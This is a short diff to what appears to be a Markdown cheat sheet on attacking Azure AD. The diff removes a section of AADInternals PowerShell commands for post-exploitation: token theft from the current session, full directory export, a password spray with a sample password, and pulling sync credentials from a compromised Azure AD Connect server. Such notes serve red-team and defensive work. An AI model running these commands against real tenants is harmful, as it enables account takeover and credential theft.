@@ -106,28 +106,6 @@ Get-AzureADServicePrincipal -All $true | ForEach-Object {
 ```
 
 
-## AADInternals (Powerful Post-Exploitation)
-
-```powershell
-# Get access token from current session
-$token = Get-AADIntAccessTokenForAADGraph
-
-# Export all Azure AD information
-Export-AADIntAzureAD
-
-# Password spray attack
-Invoke-AADIntPasswordSprayAttack -Emails users.txt -Password "Winter2024!"
-
-# Get authentication methods
-Get-AADIntUserAuthenticationMethods -UserPrincipalName user@domain.com
-
-# Check if PTA (Pass-Through Authentication) is enabled
-Get-AADIntPTAAgents
-
-# Backdoor Azure AD Sync
-# If you compromise Azure AD Connect server
-Get-AADIntSyncCredentials
-```
 
 ## ROADtools (Alternative - Very Stealthy)
 
